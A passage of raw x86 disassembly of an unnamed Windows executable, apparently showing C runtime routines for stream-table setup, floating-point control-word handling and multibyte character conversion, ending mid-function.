  40a1d0:	c1 e8 0b             	shr    $0xb,%eax
  40a1d3:	a8 01                	test   $0x1,%al
  40a1d5:	74 12                	je     0x40a1e9
  40a1d7:	56                   	push   %esi
  40a1d8:	e8 fd 06 00 00       	call   0x40a8da
  40a1dd:	50                   	push   %eax
  40a1de:	e8 b1 11 00 00       	call   0x40b394
  40a1e3:	59                   	pop    %ecx
  40a1e4:	59                   	pop    %ecx
  40a1e5:	85 c0                	test   %eax,%eax
  40a1e7:	75 04                	jne    0x40a1ed
  40a1e9:	33 c0                	xor    %eax,%eax
  40a1eb:	eb 03                	jmp    0x40a1f0
  40a1ed:	83 c8 ff             	or     $0xffffffff,%eax
  40a1f0:	5e                   	pop    %esi
  40a1f1:	5d                   	pop    %ebp
  40a1f2:	c3                   	ret
  40a1f3:	6a 01                	push   $0x1
  40a1f5:	e8 a7 fe ff ff       	call   0x40a0a1
  40a1fa:	59                   	pop    %ecx
  40a1fb:	c3                   	ret
  40a1fc:	a1 e8 72 41 00       	mov    0x4172e8,%eax
  40a201:	56                   	push   %esi
  40a202:	6a 03                	push   $0x3
  40a204:	5e                   	pop    %esi
  40a205:	85 c0                	test   %eax,%eax
  40a207:	75 07                	jne    0x40a210
  40a209:	b8 00 02 00 00       	mov    $0x200,%eax
  40a20e:	eb 06                	jmp    0x40a216
  40a210:	3b c6                	cmp    %esi,%eax
  40a212:	7d 07                	jge    0x40a21b
  40a214:	8b c6                	mov    %esi,%eax
  40a216:	a3 e8 72 41 00       	mov    %eax,0x4172e8
  40a21b:	6a 04                	push   $0x4
  40a21d:	50                   	push   %eax
  40a21e:	e8 47 d8 ff ff       	call   0x407a6a
  40a223:	6a 00                	push   $0x0
  40a225:	a3 ec 72 41 00       	mov    %eax,0x4172ec
  40a22a:	e8 98 d8 ff ff       	call   0x407ac7
  40a22f:	83 c4 0c             	add    $0xc,%esp
  40a232:	83 3d ec 72 41 00 00 	cmpl   $0x0,0x4172ec
  40a239:	75 2b                	jne    0x40a266
  40a23b:	6a 04                	push   $0x4
  40a23d:	56                   	push   %esi
  40a23e:	89 35 e8 72 41 00    	mov    %esi,0x4172e8
  40a244:	e8 21 d8 ff ff       	call   0x407a6a
  40a249:	6a 00                	push   $0x0
  40a24b:	a3 ec 72 41 00       	mov    %eax,0x4172ec
  40a250:	e8 72 d8 ff ff       	call   0x407ac7
  40a255:	83 c4 0c             	add    $0xc,%esp
  40a258:	83 3d ec 72 41 00 00 	cmpl   $0x0,0x4172ec
  40a25f:	75 05                	jne    0x40a266
  40a261:	83 c8 ff             	or     $0xffffffff,%eax
  40a264:	5e                   	pop    %esi
  40a265:	c3                   	ret
  40a266:	57                   	push   %edi
  40a267:	33 ff                	xor    %edi,%edi
  40a269:	be a8 66 41 00       	mov    $0x4166a8,%esi
  40a26e:	6a 00                	push   $0x0
  40a270:	68 a0 0f 00 00       	push   $0xfa0
  40a275:	8d 46 20             	lea    0x20(%esi),%eax
  40a278:	50                   	push   %eax
  40a279:	e8 46 d5 ff ff       	call   0x4077c4
  40a27e:	a1 ec 72 41 00       	mov    0x4172ec,%eax
  40a283:	8b d7                	mov    %edi,%edx
  40a285:	c1 fa 06             	sar    $0x6,%edx
  40a288:	89 34 b8             	mov    %esi,(%eax,%edi,4)
  40a28b:	8b c7                	mov    %edi,%eax
  40a28d:	83 e0 3f             	and    $0x3f,%eax
  40a290:	6b c8 38             	imul   $0x38,%eax,%ecx
  40a293:	8b 04 95 c8 70 41 00 	mov    0x4170c8(,%edx,4),%eax
  40a29a:	8b 44 08 18          	mov    0x18(%eax,%ecx,1),%eax
  40a29e:	83 f8 ff             	cmp    $0xffffffff,%eax
  40a2a1:	74 09                	je     0x40a2ac
  40a2a3:	83 f8 fe             	cmp    $0xfffffffe,%eax
  40a2a6:	74 04                	je     0x40a2ac
  40a2a8:	85 c0                	test   %eax,%eax
  40a2aa:	75 07                	jne    0x40a2b3
  40a2ac:	c7 46 10 fe ff ff ff 	movl   $0xfffffffe,0x10(%esi)
  40a2b3:	83 c6 38             	add    $0x38,%esi
  40a2b6:	47                   	inc    %edi
  40a2b7:	81 fe 50 67 41 00    	cmp    $0x416750,%esi
  40a2bd:	75 af                	jne    0x40a26e
  40a2bf:	5f                   	pop    %edi
  40a2c0:	33 c0                	xor    %eax,%eax
  40a2c2:	5e                   	pop    %esi
  40a2c3:	c3                   	ret
  40a2c4:	8b ff                	mov    %edi,%edi
  40a2c6:	56                   	push   %esi
  40a2c7:	e8 27 ff ff ff       	call   0x40a1f3
  40a2cc:	e8 87 1b 00 00       	call   0x40be58
  40a2d1:	33 f6                	xor    %esi,%esi
  40a2d3:	a1 ec 72 41 00       	mov    0x4172ec,%eax
  40a2d8:	ff 34 06             	push   (%esi,%eax,1)
  40a2db:	e8 23 1c 00 00       	call   0x40bf03
  40a2e0:	a1 ec 72 41 00       	mov    0x4172ec,%eax
  40a2e5:	59                   	pop    %ecx
  40a2e6:	8b 04 06             	mov    (%esi,%eax,1),%eax
  40a2e9:	83 c0 20             	add    $0x20,%eax
  40a2ec:	50                   	push   %eax
  40a2ed:	ff 15 88 f1 40 00    	call   *0x40f188
  40a2f3:	83 c6 04             	add    $0x4,%esi
  40a2f6:	83 fe 0c             	cmp    $0xc,%esi
  40a2f9:	75 d8                	jne    0x40a2d3
  40a2fb:	ff 35 ec 72 41 00    	push   0x4172ec
  40a301:	e8 c1 d7 ff ff       	call   0x407ac7
  40a306:	83 25 ec 72 41 00 00 	andl   $0x0,0x4172ec
  40a30d:	59                   	pop    %ecx
  40a30e:	5e                   	pop    %esi
  40a30f:	c3                   	ret
  40a310:	8b ff                	mov    %edi,%edi
  40a312:	55                   	push   %ebp
  40a313:	8b ec                	mov    %esp,%ebp
  40a315:	8b 45 08             	mov    0x8(%ebp),%eax
  40a318:	83 c0 20             	add    $0x20,%eax
  40a31b:	50                   	push   %eax
  40a31c:	ff 15 80 f1 40 00    	call   *0x40f180
  40a322:	5d                   	pop    %ebp
  40a323:	c3                   	ret
  40a324:	8b ff                	mov    %edi,%edi
  40a326:	55                   	push   %ebp
  40a327:	8b ec                	mov    %esp,%ebp
  40a329:	8b 45 08             	mov    0x8(%ebp),%eax
  40a32c:	83 c0 20             	add    $0x20,%eax
  40a32f:	50                   	push   %eax
  40a330:	ff 15 84 f1 40 00    	call   *0x40f184
  40a336:	5d                   	pop    %ebp
  40a337:	c3                   	ret
  40a338:	8b ff                	mov    %edi,%edi
  40a33a:	55                   	push   %ebp
  40a33b:	8b ec                	mov    %esp,%ebp
  40a33d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a340:	8b c1                	mov    %ecx,%eax
  40a342:	53                   	push   %ebx
  40a343:	83 e0 10             	and    $0x10,%eax
  40a346:	bb 00 02 00 00       	mov    $0x200,%ebx
  40a34b:	56                   	push   %esi
  40a34c:	c1 e0 03             	shl    $0x3,%eax
  40a34f:	57                   	push   %edi
  40a350:	f6 c1 08             	test   $0x8,%cl
  40a353:	74 02                	je     0x40a357
  40a355:	0b c3                	or     %ebx,%eax
  40a357:	f6 c1 04             	test   $0x4,%cl
  40a35a:	74 05                	je     0x40a361
  40a35c:	0d 00 04 00 00       	or     $0x400,%eax
  40a361:	f6 c1 02             	test   $0x2,%cl
  40a364:	74 05                	je     0x40a36b
  40a366:	0d 00 08 00 00       	or     $0x800,%eax
  40a36b:	f6 c1 01             	test   $0x1,%cl
  40a36e:	74 05                	je     0x40a375
  40a370:	0d 00 10 00 00       	or     $0x1000,%eax
  40a375:	be 00 01 00 00       	mov    $0x100,%esi
  40a37a:	f7 c1 00 00 08 00    	test   $0x80000,%ecx
  40a380:	74 02                	je     0x40a384
  40a382:	0b c6                	or     %esi,%eax
  40a384:	8b d1                	mov    %ecx,%edx
  40a386:	bf 00 03 00 00       	mov    $0x300,%edi
  40a38b:	23 d7                	and    %edi,%edx
  40a38d:	74 1f                	je     0x40a3ae
  40a38f:	3b d6                	cmp    %esi,%edx
  40a391:	74 16                	je     0x40a3a9
  40a393:	3b d3                	cmp    %ebx,%edx
  40a395:	74 0b                	je     0x40a3a2
  40a397:	3b d7                	cmp    %edi,%edx
  40a399:	75 13                	jne    0x40a3ae
  40a39b:	0d 00 60 00 00       	or     $0x6000,%eax
  40a3a0:	eb 0c                	jmp    0x40a3ae
  40a3a2:	0d 00 40 00 00       	or     $0x4000,%eax
  40a3a7:	eb 05                	jmp    0x40a3ae
  40a3a9:	0d 00 20 00 00       	or     $0x2000,%eax
  40a3ae:	ba 00 00 00 03       	mov    $0x3000000,%edx
  40a3b3:	5f                   	pop    %edi
  40a3b4:	23 ca                	and    %edx,%ecx
  40a3b6:	5e                   	pop    %esi
  40a3b7:	5b                   	pop    %ebx
  40a3b8:	81 f9 00 00 00 01    	cmp    $0x1000000,%ecx
  40a3be:	74 18                	je     0x40a3d8
  40a3c0:	81 f9 00 00 00 02    	cmp    $0x2000000,%ecx
  40a3c6:	74 0b                	je     0x40a3d3
  40a3c8:	3b ca                	cmp    %edx,%ecx
  40a3ca:	75 11                	jne    0x40a3dd
  40a3cc:	0d 00 80 00 00       	or     $0x8000,%eax
  40a3d1:	5d                   	pop    %ebp
  40a3d2:	c3                   	ret
  40a3d3:	83 c8 40             	or     $0x40,%eax
  40a3d6:	5d                   	pop    %ebp
  40a3d7:	c3                   	ret
  40a3d8:	0d 40 80 00 00       	or     $0x8040,%eax
  40a3dd:	5d                   	pop    %ebp
  40a3de:	c3                   	ret
  40a3df:	8b ff                	mov    %edi,%edi
  40a3e1:	55                   	push   %ebp
  40a3e2:	8b ec                	mov    %esp,%ebp
  40a3e4:	83 ec 10             	sub    $0x10,%esp
  40a3e7:	9b d9 7d f8          	fstcw  -0x8(%ebp)
  40a3eb:	66 8b 45 f8          	mov    -0x8(%ebp),%ax
  40a3ef:	0f b7 c8             	movzwl %ax,%ecx
  40a3f2:	83 e1 01             	and    $0x1,%ecx
  40a3f5:	c1 e1 04             	shl    $0x4,%ecx
  40a3f8:	a8 04                	test   $0x4,%al
  40a3fa:	74 03                	je     0x40a3ff
  40a3fc:	83 c9 08             	or     $0x8,%ecx
  40a3ff:	a8 08                	test   $0x8,%al
  40a401:	74 03                	je     0x40a406
  40a403:	83 c9 04             	or     $0x4,%ecx
  40a406:	a8 10                	test   $0x10,%al
  40a408:	74 03                	je     0x40a40d
  40a40a:	83 c9 02             	or     $0x2,%ecx
  40a40d:	a8 20                	test   $0x20,%al
  40a40f:	74 03                	je     0x40a414
  40a411:	83 c9 01             	or     $0x1,%ecx
  40a414:	a8 02                	test   $0x2,%al
  40a416:	74 06                	je     0x40a41e
  40a418:	81 c9 00 00 08 00    	or     $0x80000,%ecx
  40a41e:	53                   	push   %ebx
  40a41f:	56                   	push   %esi
  40a420:	0f b7 f0             	movzwl %ax,%esi
  40a423:	bb 00 0c 00 00       	mov    $0xc00,%ebx
  40a428:	8b d6                	mov    %esi,%edx
  40a42a:	57                   	push   %edi
  40a42b:	bf 00 02 00 00       	mov    $0x200,%edi
  40a430:	23 d3                	and    %ebx,%edx
  40a432:	74 26                	je     0x40a45a
  40a434:	81 fa 00 04 00 00    	cmp    $0x400,%edx
  40a43a:	74 18                	je     0x40a454
  40a43c:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  40a442:	74 0c                	je     0x40a450
  40a444:	3b d3                	cmp    %ebx,%edx
  40a446:	75 12                	jne    0x40a45a
  40a448:	81 c9 00 03 00 00    	or     $0x300,%ecx
  40a44e:	eb 0a                	jmp    0x40a45a
  40a450:	0b cf                	or     %edi,%ecx
  40a452:	eb 06                	jmp    0x40a45a
  40a454:	81 c9 00 01 00 00    	or     $0x100,%ecx
  40a45a:	81 e6 00 03 00 00    	and    $0x300,%esi
  40a460:	74 0c                	je     0x40a46e
  40a462:	3b f7                	cmp    %edi,%esi
  40a464:	75 0e                	jne    0x40a474
  40a466:	81 c9 00 00 01 00    	or     $0x10000,%ecx
  40a46c:	eb 06                	jmp    0x40a474
  40a46e:	81 c9 00 00 02 00    	or     $0x20000,%ecx
  40a474:	0f b7 c0             	movzwl %ax,%eax
  40a477:	ba 00 10 00 00       	mov    $0x1000,%edx
  40a47c:	85 c2                	test   %eax,%edx
  40a47e:	74 06                	je     0x40a486
  40a480:	81 c9 00 00 04 00    	or     $0x40000,%ecx
  40a486:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40a489:	8b f7                	mov    %edi,%esi
  40a48b:	8b 45 08             	mov    0x8(%ebp),%eax
  40a48e:	f7 d6                	not    %esi
  40a490:	23 f1                	and    %ecx,%esi
  40a492:	23 c7                	and    %edi,%eax
  40a494:	0b f0                	or     %eax,%esi
  40a496:	3b f1                	cmp    %ecx,%esi
  40a498:	0f 84 a8 00 00 00    	je     0x40a546
  40a49e:	56                   	push   %esi
  40a49f:	e8 3c 02 00 00       	call   0x40a6e0
  40a4a4:	59                   	pop    %ecx
  40a4a5:	66 89 45 fc          	mov    %ax,-0x4(%ebp)
  40a4a9:	d9 6d fc             	fldcw  -0x4(%ebp)
  40a4ac:	9b d9 7d fc          	fstcw  -0x4(%ebp)
  40a4b0:	66 8b 45 fc          	mov    -0x4(%ebp),%ax
  40a4b4:	0f b7 f0             	movzwl %ax,%esi
  40a4b7:	83 e6 01             	and    $0x1,%esi
  40a4ba:	c1 e6 04             	shl    $0x4,%esi
  40a4bd:	a8 04                	test   $0x4,%al
  40a4bf:	74 03                	je     0x40a4c4
  40a4c1:	83 ce 08             	or     $0x8,%esi
  40a4c4:	a8 08                	test   $0x8,%al
  40a4c6:	74 03                	je     0x40a4cb
  40a4c8:	83 ce 04             	or     $0x4,%esi
  40a4cb:	a8 10                	test   $0x10,%al
  40a4cd:	74 03                	je     0x40a4d2
  40a4cf:	83 ce 02             	or     $0x2,%esi
  40a4d2:	a8 20                	test   $0x20,%al
  40a4d4:	74 03                	je     0x40a4d9
  40a4d6:	83 ce 01             	or     $0x1,%esi
  40a4d9:	a8 02                	test   $0x2,%al
  40a4db:	74 06                	je     0x40a4e3
  40a4dd:	81 ce 00 00 08 00    	or     $0x80000,%esi
  40a4e3:	0f b7 d0             	movzwl %ax,%edx
  40a4e6:	8b ca                	mov    %edx,%ecx
  40a4e8:	23 cb                	and    %ebx,%ecx
  40a4ea:	74 2a                	je     0x40a516
  40a4ec:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
  40a4f2:	74 1c                	je     0x40a510
  40a4f4:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  40a4fa:	74 0c                	je     0x40a508
  40a4fc:	3b cb                	cmp    %ebx,%ecx
  40a4fe:	75 16                	jne    0x40a516
  40a500:	81 ce 00 03 00 00    	or     $0x300,%esi
  40a506:	eb 0e                	jmp    0x40a516
  40a508:	81 ce 00 02 00 00    	or     $0x200,%esi
  40a50e:	eb 06                	jmp    0x40a516
  40a510:	81 ce 00 01 00 00    	or     $0x100,%esi
  40a516:	81 e2 00 03 00 00    	and    $0x300,%edx
  40a51c:	74 10                	je     0x40a52e
  40a51e:	81 fa 00 02 00 00    	cmp    $0x200,%edx
  40a524:	75 0e                	jne    0x40a534
  40a526:	81 ce 00 00 01 00    	or     $0x10000,%esi
  40a52c:	eb 06                	jmp    0x40a534
  40a52e:	81 ce 00 00 02 00    	or     $0x20000,%esi
  40a534:	0f b7 c0             	movzwl %ax,%eax
  40a537:	ba 00 10 00 00       	mov    $0x1000,%edx
  40a53c:	85 c2                	test   %eax,%edx
  40a53e:	74 06                	je     0x40a546
  40a540:	81 ce 00 00 04 00    	or     $0x40000,%esi
  40a546:	83 3d 54 6c 41 00 01 	cmpl   $0x1,0x416c54
  40a54d:	0f 8c 86 01 00 00    	jl     0x40a6d9
  40a553:	81 e7 1f 03 08 03    	and    $0x308031f,%edi
  40a559:	0f ae 5d f0          	stmxcsr -0x10(%ebp)
  40a55d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40a560:	8b c1                	mov    %ecx,%eax
  40a562:	c1 e8 03             	shr    $0x3,%eax
  40a565:	83 e0 10             	and    $0x10,%eax
  40a568:	f7 c1 00 02 00 00    	test   $0x200,%ecx
  40a56e:	74 03                	je     0x40a573
  40a570:	83 c8 08             	or     $0x8,%eax
  40a573:	f7 c1 00 04 00 00    	test   $0x400,%ecx
  40a579:	74 03                	je     0x40a57e
  40a57b:	83 c8 04             	or     $0x4,%eax
  40a57e:	f7 c1 00 08 00 00    	test   $0x800,%ecx
  40a584:	74 03                	je     0x40a589
  40a586:	83 c8 02             	or     $0x2,%eax
  40a589:	85 ca                	test   %ecx,%edx
  40a58b:	74 03                	je     0x40a590
  40a58d:	83 c8 01             	or     $0x1,%eax
  40a590:	f7 c1 00 01 00 00    	test   $0x100,%ecx
  40a596:	74 05                	je     0x40a59d
  40a598:	0d 00 00 08 00       	or     $0x80000,%eax
  40a59d:	8b d1                	mov    %ecx,%edx
  40a59f:	bb 00 60 00 00       	mov    $0x6000,%ebx
  40a5a4:	23 d3                	and    %ebx,%edx
  40a5a6:	74 27                	je     0x40a5cf
  40a5a8:	81 fa 00 20 00 00    	cmp    $0x2000,%edx
  40a5ae:	74 1a                	je     0x40a5ca
  40a5b0:	81 fa 00 40 00 00    	cmp    $0x4000,%edx
  40a5b6:	74 0b                	je     0x40a5c3
  40a5b8:	3b d3                	cmp    %ebx,%edx
  40a5ba:	75 13                	jne    0x40a5cf
  40a5bc:	0d 00 03 00 00       	or     $0x300,%eax
  40a5c1:	eb 0c                	jmp    0x40a5cf
  40a5c3:	0d 00 02 00 00       	or     $0x200,%eax
  40a5c8:	eb 05                	jmp    0x40a5cf
  40a5ca:	0d 00 01 00 00       	or     $0x100,%eax
  40a5cf:	6a 40                	push   $0x40
  40a5d1:	81 e1 40 80 00 00    	and    $0x8040,%ecx
  40a5d7:	5b                   	pop    %ebx
  40a5d8:	2b cb                	sub    %ebx,%ecx
  40a5da:	74 1a                	je     0x40a5f6
  40a5dc:	81 e9 c0 7f 00 00    	sub    $0x7fc0,%ecx
  40a5e2:	74 0b                	je     0x40a5ef
  40a5e4:	2b cb                	sub    %ebx,%ecx
  40a5e6:	75 13                	jne    0x40a5fb
  40a5e8:	0d 00 00 00 01       	or     $0x1000000,%eax
  40a5ed:	eb 0c                	jmp    0x40a5fb
  40a5ef:	0d 00 00 00 03       	or     $0x3000000,%eax
  40a5f4:	eb 05                	jmp    0x40a5fb
  40a5f6:	0d 00 00 00 02       	or     $0x2000000,%eax
  40a5fb:	8b cf                	mov    %edi,%ecx
  40a5fd:	23 7d 08             	and    0x8(%ebp),%edi
  40a600:	f7 d1                	not    %ecx
  40a602:	23 c8                	and    %eax,%ecx
  40a604:	0b cf                	or     %edi,%ecx
  40a606:	3b c8                	cmp    %eax,%ecx
  40a608:	0f 84 b4 00 00 00    	je     0x40a6c2
  40a60e:	51                   	push   %ecx
  40a60f:	e8 24 fd ff ff       	call   0x40a338
  40a614:	50                   	push   %eax
  40a615:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40a618:	e8 7c 19 00 00       	call   0x40bf99
  40a61d:	59                   	pop    %ecx
  40a61e:	59                   	pop    %ecx
  40a61f:	0f ae 5d f4          	stmxcsr -0xc(%ebp)
  40a623:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40a626:	8b c1                	mov    %ecx,%eax
  40a628:	c1 e8 03             	shr    $0x3,%eax
  40a62b:	83 e0 10             	and    $0x10,%eax
  40a62e:	f7 c1 00 02 00 00    	test   $0x200,%ecx
  40a634:	74 03                	je     0x40a639
  40a636:	83 c8 08             	or     $0x8,%eax
  40a639:	f7 c1 00 04 00 00    	test   $0x400,%ecx
  40a63f:	74 03                	je     0x40a644
  40a641:	83 c8 04             	or     $0x4,%eax
  40a644:	f7 c1 00 08 00 00    	test   $0x800,%ecx
  40a64a:	74 03                	je     0x40a64f
  40a64c:	83 c8 02             	or     $0x2,%eax
  40a64f:	f7 c1 00 10 00 00    	test   $0x1000,%ecx
  40a655:	74 03                	je     0x40a65a
  40a657:	83 c8 01             	or     $0x1,%eax
  40a65a:	f7 c1 00 01 00 00    	test   $0x100,%ecx
  40a660:	74 05                	je     0x40a667
  40a662:	0d 00 00 08 00       	or     $0x80000,%eax
  40a667:	8b d1                	mov    %ecx,%edx
  40a669:	bf 00 60 00 00       	mov    $0x6000,%edi
  40a66e:	23 d7                	and    %edi,%edx
  40a670:	74 27                	je     0x40a699
  40a672:	81 fa 00 20 00 00    	cmp    $0x2000,%edx
  40a678:	74 1a                	je     0x40a694
  40a67a:	81 fa 00 40 00 00    	cmp    $0x4000,%edx
  40a680:	74 0b                	je     0x40a68d
  40a682:	3b d7                	cmp    %edi,%edx
  40a684:	75 13                	jne    0x40a699
  40a686:	0d 00 03 00 00       	or     $0x300,%eax
  40a68b:	eb 0c                	jmp    0x40a699
  40a68d:	0d 00 02 00 00       	or     $0x200,%eax
  40a692:	eb 05                	jmp    0x40a699
  40a694:	0d 00 01 00 00       	or     $0x100,%eax
  40a699:	81 e1 40 80 00 00    	and    $0x8040,%ecx
  40a69f:	2b cb                	sub    %ebx,%ecx
  40a6a1:	74 1a                	je     0x40a6bd
  40a6a3:	81 e9 c0 7f 00 00    	sub    $0x7fc0,%ecx
  40a6a9:	74 0b                	je     0x40a6b6
  40a6ab:	2b cb                	sub    %ebx,%ecx
  40a6ad:	75 13                	jne    0x40a6c2
  40a6af:	0d 00 00 00 01       	or     $0x1000000,%eax
  40a6b4:	eb 0c                	jmp    0x40a6c2
  40a6b6:	0d 00 00 00 03       	or     $0x3000000,%eax
  40a6bb:	eb 05                	jmp    0x40a6c2
  40a6bd:	0d 00 00 00 02       	or     $0x2000000,%eax
  40a6c2:	8b c8                	mov    %eax,%ecx
  40a6c4:	33 c6                	xor    %esi,%eax
  40a6c6:	0b ce                	or     %esi,%ecx
  40a6c8:	a9 1f 03 08 00       	test   $0x8031f,%eax
  40a6cd:	74 06                	je     0x40a6d5
  40a6cf:	81 c9 00 00 00 80    	or     $0x80000000,%ecx
  40a6d5:	8b c1                	mov    %ecx,%eax
  40a6d7:	eb 02                	jmp    0x40a6db
  40a6d9:	8b c6                	mov    %esi,%eax
  40a6db:	5f                   	pop    %edi
  40a6dc:	5e                   	pop    %esi
  40a6dd:	5b                   	pop    %ebx
  40a6de:	c9                   	leave
  40a6df:	c3                   	ret
  40a6e0:	8b ff                	mov    %edi,%edi
  40a6e2:	55                   	push   %ebp
  40a6e3:	8b ec                	mov    %esp,%ebp
  40a6e5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a6e8:	8b d1                	mov    %ecx,%edx
  40a6ea:	c1 ea 04             	shr    $0x4,%edx
  40a6ed:	83 e2 01             	and    $0x1,%edx
  40a6f0:	8b c2                	mov    %edx,%eax
  40a6f2:	f6 c1 08             	test   $0x8,%cl
  40a6f5:	74 06                	je     0x40a6fd
  40a6f7:	83 ca 04             	or     $0x4,%edx
  40a6fa:	0f b7 c2             	movzwl %dx,%eax
  40a6fd:	f6 c1 04             	test   $0x4,%cl
  40a700:	74 03                	je     0x40a705
  40a702:	83 c8 08             	or     $0x8,%eax
  40a705:	f6 c1 02             	test   $0x2,%cl
  40a708:	74 03                	je     0x40a70d
  40a70a:	83 c8 10             	or     $0x10,%eax
  40a70d:	f6 c1 01             	test   $0x1,%cl
  40a710:	74 03                	je     0x40a715
  40a712:	83 c8 20             	or     $0x20,%eax
  40a715:	f7 c1 00 00 08 00    	test   $0x80000,%ecx
  40a71b:	74 03                	je     0x40a720
  40a71d:	83 c8 02             	or     $0x2,%eax
  40a720:	56                   	push   %esi
  40a721:	8b d1                	mov    %ecx,%edx
  40a723:	be 00 03 00 00       	mov    $0x300,%esi
  40a728:	57                   	push   %edi
  40a729:	bf 00 02 00 00       	mov    $0x200,%edi
  40a72e:	23 d6                	and    %esi,%edx
  40a730:	74 23                	je     0x40a755
  40a732:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  40a738:	74 16                	je     0x40a750
  40a73a:	3b d7                	cmp    %edi,%edx
  40a73c:	74 0b                	je     0x40a749
  40a73e:	3b d6                	cmp    %esi,%edx
  40a740:	75 13                	jne    0x40a755
  40a742:	0d 00 0c 00 00       	or     $0xc00,%eax
  40a747:	eb 0c                	jmp    0x40a755
  40a749:	0d 00 08 00 00       	or     $0x800,%eax
  40a74e:	eb 05                	jmp    0x40a755
  40a750:	0d 00 04 00 00       	or     $0x400,%eax
  40a755:	8b d1                	mov    %ecx,%edx
  40a757:	81 e2 00 00 03 00    	and    $0x30000,%edx
  40a75d:	74 0c                	je     0x40a76b
  40a75f:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
  40a765:	75 06                	jne    0x40a76d
  40a767:	0b c7                	or     %edi,%eax
  40a769:	eb 02                	jmp    0x40a76d
  40a76b:	0b c6                	or     %esi,%eax
  40a76d:	5f                   	pop    %edi
  40a76e:	5e                   	pop    %esi
  40a76f:	f7 c1 00 00 04 00    	test   $0x40000,%ecx
  40a775:	74 05                	je     0x40a77c
  40a777:	0d 00 10 00 00       	or     $0x1000,%eax
  40a77c:	5d                   	pop    %ebp
  40a77d:	c3                   	ret
  40a77e:	8b ff                	mov    %edi,%edi
  40a780:	55                   	push   %ebp
  40a781:	8b ec                	mov    %esp,%ebp
  40a783:	83 ec 10             	sub    $0x10,%esp
  40a786:	53                   	push   %ebx
  40a787:	57                   	push   %edi
  40a788:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40a78b:	85 ff                	test   %edi,%edi
  40a78d:	0f 84 19 01 00 00    	je     0x40a8ac
  40a793:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40a796:	85 db                	test   %ebx,%ebx
  40a798:	0f 84 0e 01 00 00    	je     0x40a8ac
  40a79e:	80 3f 00             	cmpb   $0x0,(%edi)
  40a7a1:	75 15                	jne    0x40a7b8
  40a7a3:	8b 45 08             	mov    0x8(%ebp),%eax
  40a7a6:	85 c0                	test   %eax,%eax
  40a7a8:	0f 84 0c 01 00 00    	je     0x40a8ba
  40a7ae:	33 c9                	xor    %ecx,%ecx
  40a7b0:	66 89 08             	mov    %cx,(%eax)
  40a7b3:	e9 02 01 00 00       	jmp    0x40a8ba
  40a7b8:	56                   	push   %esi
  40a7b9:	ff 75 14             	push   0x14(%ebp)
  40a7bc:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a7bf:	e8 9c b0 ff ff       	call   0x405860
  40a7c4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40a7c7:	81 78 08 e9 fd 00 00 	cmpl   $0xfde9,0x8(%eax)
  40a7ce:	75 21                	jne    0x40a7f1
  40a7d0:	68 f8 72 41 00       	push   $0x4172f8
  40a7d5:	53                   	push   %ebx
  40a7d6:	57                   	push   %edi
  40a7d7:	ff 75 08             	push   0x8(%ebp)
  40a7da:	e8 44 19 00 00       	call   0x40c123
  40a7df:	8b f0                	mov    %eax,%esi
  40a7e1:	83 c4 10             	add    $0x10,%esp
  40a7e4:	85 f6                	test   %esi,%esi
  40a7e6:	0f 89 ab 00 00 00    	jns    0x40a897
  40a7ec:	e9 a3 00 00 00       	jmp    0x40a894
  40a7f1:	83 b8 a8 00 00 00 00 	cmpl   $0x0,0xa8(%eax)
  40a7f8:	75 15                	jne    0x40a80f
  40a7fa:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a7fd:	85 c9                	test   %ecx,%ecx
  40a7ff:	74 06                	je     0x40a807
  40a801:	0f b6 07             	movzbl (%edi),%eax
  40a804:	66 89 01             	mov    %ax,(%ecx)
  40a807:	33 f6                	xor    %esi,%esi
  40a809:	46                   	inc    %esi
  40a80a:	e9 88 00 00 00       	jmp    0x40a897
  40a80f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40a812:	50                   	push   %eax
  40a813:	0f b6 07             	movzbl (%edi),%eax
  40a816:	50                   	push   %eax
  40a817:	e8 a1 18 00 00       	call   0x40c0bd
  40a81c:	59                   	pop    %ecx
  40a81d:	59                   	pop    %ecx
  40a81e:	85 c0                	test   %eax,%eax
  40a820:	74 42                	je     0x40a864
  40a822:	8b 75 f4             	mov    -0xc(%ebp),%esi
  40a825:	83 7e 04 01          	cmpl   $0x1,0x4(%esi)
  40a829:	7e 29                	jle    0x40a854
  40a82b:	3b 5e 04             	cmp    0x4(%esi),%ebx
  40a82e:	7c 27                	jl     0x40a857
  40a830:	33 c0                	xor    %eax,%eax
  40a832:	39 45 08             	cmp    %eax,0x8(%ebp)
  40a835:	0f 95 c0             	setne  %al
  40a838:	50                   	push   %eax
  40a839:	ff 75 08             	push   0x8(%ebp)
  40a83c:	ff 76 04             	push   0x4(%esi)
  40a83f:	57                   	push   %edi
  40a840:	6a 09                	push   $0x9
  40a842:	ff 76 08             	push   0x8(%esi)
  40a845:	e8 fb e4 ff ff       	call   0x408d45
  40a84a:	8b 75 f4             	mov    -0xc(%ebp),%esi
  40a84d:	83 c4 18             	add    $0x18,%esp
  40a850:	85 c0                	test   %eax,%eax
  40a852:	75 0b                	jne    0x40a85f
  40a854:	3b 5e 04             	cmp    0x4(%esi),%ebx
  40a857:	72 30                	jb     0x40a889
  40a859:	80 7f 01 00          	cmpb   $0x0,0x1(%edi)
  40a85d:	74 2a                	je     0x40a889
  40a85f:	8b 76 04             	mov    0x4(%esi),%esi
  40a862:	eb 33                	jmp    0x40a897
  40a864:	33 c0                	xor    %eax,%eax
  40a866:	39 45 08             	cmp    %eax,0x8(%ebp)
  40a869:	0f 95 c0             	setne  %al
  40a86c:	33 f6                	xor    %esi,%esi
  40a86e:	50                   	push   %eax
  40a86f:	ff 75 08             	push   0x8(%ebp)
  40a872:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40a875:	46                   	inc    %esi
  40a876:	56                   	push   %esi
  40a877:	57                   	push   %edi
  40a878:	6a 09                	push   $0x9
